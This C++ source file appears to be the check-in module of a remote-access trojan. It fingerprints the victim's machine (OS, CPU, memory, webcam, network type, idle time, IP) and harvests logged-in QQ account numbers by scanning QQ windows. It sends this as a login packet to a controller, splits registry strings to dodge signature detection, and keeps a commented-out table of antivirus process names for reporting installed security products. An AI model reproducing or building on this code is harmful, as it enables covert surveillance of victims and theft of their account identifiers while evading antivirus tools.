
#include "LoginServer.h"
#include <string>
#include "RegEditEx.h"
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include "until.h"

//typedef struct
//{
//	char* Course;
//	char* Name;
//}AYSDFE;
//
//
//
//AYSDFE g_AntiVirus_Data[40] =
//{
//	{"360tray.exe",       "360安全卫士"},
//	{"360sd.exe",         "360杀毒"},
//	{"kxetray.exe",       "金山毒霸"},
//	{"KSafeTray.exe",     "金山安全卫士"},
//	{"QQPCRTP.exe",       "QQ电脑管家"},
//	{"HipsTray.exe",      "火绒"},
//	{"BaiduSd.exe",       "百度杀毒"},
//	{"baiduSafeTray.exe", "百度卫士"},
//	{"KvMonXP.exe",       "江民"},
//	{"RavMonD.exe",       "瑞星"},
//	{"QUHLPSVC.EXE",      "QuickHeal"},   //印度
//	{"mssecess.exe",      "微软MSE"},
//	{"cfp.exe",           "Comodo杀毒"},
//	{"SPIDer.exe",        "DR.WEB"},      //大蜘蛛
//	{"acs.exe",           "Outpost"},
//	{"V3Svc.exe",         "安博士V3"},
//	{"AYAgent.aye",       "韩国胶囊"},
//	{"avgwdsvc.exe",      "AVG"},
//	{"f-secure.exe",      "F-Secure"},    //芬安全
//	{"avp.exe",           "卡巴"},
//	{"Mcshield.exe",      "麦咖啡"},
//	{"egui.exe",          "NOD32"},
//	{"knsdtray.exe",      "可牛"},
//	{"TMBMSRV.exe",       "趋势"},
//	{"avcenter.exe",      "小红伞"},
//	{"ashDisp.exe",       "Avast网络安全"},
//	{"rtvscan.exe",       "诺顿"},
//	{"remupd.exe",        "熊猫卫士"},
//	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
//	{"PSafeSysTray.exe",  "PSafe反病毒"}, //巴西
//	{"ad-watch.exe",      "Ad-watch反间谍"},
//	{"K7TSecurity.exe",   "K7杀毒"},
//	{"UnThreat.exe",      "UnThreat"},    //保加利亚
//	{"  ",                "  "}
//};



DWORD CPUClockMHz()
{
	/*HKEY	hKey;
	DWORD	dwCPUMHz;
	DWORD	dwReturn = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE,
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
	RegCloseKey(hKey);
	return	dwCPUMHz;*/
	char str1[256] = "~M";
	char str2[256] = "Hz";
	strcat(str1, str2);

	char str3[256] = "HARDWARE\\DESCRIPTION\\Sys";
	char str4[256] = "tem\\CentralProcessor\\0";
	strcat(str3, str4);

	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, str3, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

BOOL WebCamIsExist()
{
	BOOL	bOk = FALSE;

	char	szDeviceName[100], szVer[50];
	for (int i = 0; i < 10 && !bOk; ++i)
	{
		bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),
			//系统的API函数
			szVer, sizeof(szVer));
	}
	return bOk;
}

//char* ssdd()
//{
//	static char AllName[1024];
//	int t = 0;
//	memset(AllName, 0, sizeof(AllName));
//	while (1)
//	{
//		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
//		{
//			if (GetProcessID(g_AntiVirus_Data[t].Course))
//			{
//				lstrcat(AllName, g_AntiVirus_Data[t].Name);
//				lstrcat(AllName, " ");
//			}
//		}
//		else
//			break;
//		t++;
//	}
//
//	if (strstr(AllName, " ") == 0)
//	{
//		lstrcat(AllName, "暂未发现");
//	}
//
//	return AllName;
//}



std::string getSystemName2()
{
	std::string vname("未知操作系统");
	//先判断是否为win8.1或win10
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers"); 
	proc(&dwMajor, &dwMinor, &dwBuildNumber); 
	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
	{
		vname = "Windows 8.1";
		printf_s("此电脑的版本为:%s\n", vname.c_str());
		return vname;
	}
	if (dwMajor == 10 && dwMinor == 0)	//win 10
	{
		vname = "Windows 10";
		printf_s("此电脑的版本为:%s\n", vname.c_str());
		return vname;
	}
	//下面不能判断Win Server，因为本人还未有这种系统的机子，暂时不给出

	//判断win8.1以下的版本
	SYSTEM_INFO info;                //用SYSTEM_INFO结构判断64位AMD处理器
	GetSystemInfo(&info);            //调用GetSystemInfo函数填充结构
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		//下面根据版本信息判断操作系统名称
		switch (os.dwMajorVersion)
		{                    //判断主版本号
		case 4:
			switch (os.dwMinorVersion)
			{                //判断次版本号
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					vname ="Windows NT 4.0";  //1996年7月发布
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					vname = "Windows 95";
				break;
			case 10:
				vname ="Windows 98";
				break;
			case 90:
				vname = "Windows Me";
				break;
			}
			break;
		case 5:
			switch (os.dwMinorVersion)
			{               //再比较dwMinorVersion的值
			case 0:
				vname = "Windows 2000";    //1999年12月发布
				break;
			case 1:
				vname = "Windows XP";      //2001年8月发布
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION &&
					info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
					vname = "Windows XP Professional x64 Edition";
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					vname = "Windows Server 2003";   //2003年3月发布
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					vname = "Windows Server 2003 R2";
				break;
			}
			break;
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows Vista";
				else
					vname = "Windows Server 2008";   //服务器版本
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 7";
				else
					vname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 8";
				else
					vname = "Windows Server 2012";
				break;
			}
			break;
		default:
			vname = "未知操作系统";
		}
		printf_s("此电脑的版本为:%s\n", vname.c_str());
	}
	else
		printf_s("版本获取失败\n");
	return vname;
}

UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	LPCTSTR lpServiceName = "gfi";
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char*)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

BOOL IsWindows64()
{

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)::GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
	BOOL bIsWow64 = FALSE;
	if (fnIsWow64Process)
		if (!fnIsWow64Process(::GetCurrentProcess(), &bIsWow64))
			bIsWow64 = FALSE;
	return bIsWow64;
}
void clean_string(char* str)//去首尾空格
{
	char* start = str - 1;
	char* end = str;
	char* p = str;
	while (*p)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (start + 1 == p)
				start = p;
		}
		break;
		default:
			break;
		}
		++p;
	}
	//现在来到了字符串的尾部 反向向前
	--p;
	++start;
	if (*start == 0)
	{
		//已经到字符串的末尾了 
		*str = 0;
		return;
	}
	end = p + 1;
	while (p > start)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (end - 1 == p)
				end = p;
		}
		break;
		default:
			break;
		}
		--p;
	}
	memmove(str, start, end - start);
	*(str + (int)end - (int)start) = 0;
}
char* GetQQ()
{
	char QQ[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = "CTXOPConntion_Class";
	char szQQNumber[MAX_PATH] = { 0 };
	HWND hWnd = FindWindow(szText, NULL);
	while (hWnd)
	{
		if (strcmp(szText, "CTXOPConntion_Class") == 0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len + 1]);
			strcat(QQ, szQQNumber);
			strcat(QQ, " ");
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		GetClassName(hWnd, szText, MAX_PATH);
	}
	CloseHandle(hWnd);
	clean_string(QQ);
	if (strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}

#include <wininet.h>
TCHAR* ConnectionKind()
{
	DWORD flags;
	if (InternetGetConnectedState(&flags, 0))
	{
		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
		{
			return _T("MODEM 连接");
		}
		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
		{
			return _T("LAN 连接");
		}
		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
		{
			return _T("PROXY 连接");
		}
		else if ((flags & INTERNET_CONNECTION_MODEM_BUSY) == INTERNET_CONNECTION_MODEM_BUSY)
		{
			return _T("BUSY 连接");
		}
		else
			return _T("OTHER 连接");
	}
	return _T("OTHER 连接");
}
int sendLoginInfo(CClientSocket* ClientObject,DWORD dwSpeed)
{
	LOGIN_INFOR  LoginInfor = {0};
	LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
	//获得操作系统信息
	//strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());

	////获得PCName
	//char szPCName[MAX_PATH] = {0};
	//gethostname(szPCName, MAX_PATH);  
	// 主机名
	char szPCName[256];
	GetHostRemark(szPCName, sizeof(szPCName));



	//获得ClientIP
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int iLen = sizeof(sockaddr_in);
	getsockname(ClientObject->m_Socket, (SOCKADDR*)&ClientAddr, &iLen);
	memcpy(&LoginInfor.IPAddress, (void*)&ClientAddr.sin_addr, sizeof(IN_ADDR));

	// 判断 是不是 64位系统
	LoginInfor.bIsWow64 = IsWindows64();


	// 用户状态
	LoginInfor.bIsActive = false;
	//是否活动
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//获取上次输入操作的时间。
	if ((::GetTickCount() - lpi.dwTime) > 1000 * 60 * 3)//5分钟
	{
		//当前系统已经空闲了1分钟
		LoginInfor.bIsActive = true;
	}

	// 获取Qq
	lstrcpy(LoginInfor.szQQNum, GetQQ());

	// 杀毒软件
	//strcpy(LoginInfor.Virus, ssdd());

	//net
	lstrcpy(LoginInfor.sznet, ConnectionKind());
	DWORD	dwCPUMHz;
	dwCPUMHz = CPUClockMHz();
	//
	SYSTEM_INFO SysInfo;//用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfor.nCPUNumber = SysInfo.dwNumberOfProcessors;


		// 内存
	MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
	MemInfo.dwLength = sizeof(MemInfo);
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys / 1024 / 1024;
	LoginInfor.MemSize = (unsigned long)strMem;







	BOOL bWebCamIsExist = WebCamIsExist();

	memcpy(LoginInfor.szPCName,szPCName,MAX_PATH);
	LoginInfor.dwSpeed  = dwSpeed;
	LoginInfor.dwCPUMHz = dwCPUMHz;
	LoginInfor.ClientAddr = ClientAddr.sin_addr;
	LoginInfor.bWebCamIsExist = bWebCamIsExist;
	int nan1 = sizeof(LOGIN_INFOR);
	int iRet = ClientObject->Send((LPBYTE)&LoginInfor, sizeof(LOGIN_INFOR));

	return iRet;
}

